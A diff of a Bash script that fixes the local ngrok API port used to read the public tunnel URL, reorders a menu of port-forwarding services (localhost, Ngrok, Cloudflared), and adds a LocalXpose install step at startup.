@@ -674,7 +674,7 @@ start_ngrok() {
 	sleep 5 #Give ngrok time to start
 
 	#Find the ngrok URL (you may need to adjust the grep if the output format changes)
-	ngrok_url=$(curl -s localhost:8080/api/tunnels | jq -r '.tunnels[0].public_url')
+	ngrok_url=$(curl -s localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')
 
 
 	if [[ -z "$ngrok_url" ]]; then
@@ -692,8 +692,8 @@ tunnel_menu() {
 	cat <<- EOF
 		${WHITE} 0. Main Menu
 		${WHITE} 1. Localhost
-		${WHITE} 2. Cloudflared
-		${WHITE} 3. Ngrok
+		${WHITE} 2. Ngrok.io
+		${WHITE} 3. Cloudflared
 	EOF
 
 	read -p "${WHITE} Select a port forwarding service or return to main menu:"
@@ -705,9 +705,9 @@ tunnel_menu() {
 		1 | 01)
 			start_localhost;;
 		2 | 02)
-			start_cloudflared;;
-		3 | 03)
 			start_ngrok;;
+		3 | 03)
+			start_cloudflared;;
 		*)
 			echo -ne "\n${RED} Invalid Option, Try Again..."
 			{ sleep 1; tunnel_menu; };;
@@ -979,4 +979,5 @@ dependencies
 check_status
 install_ngrok
 install_cloudflared
+install_localxpose
 main_menu
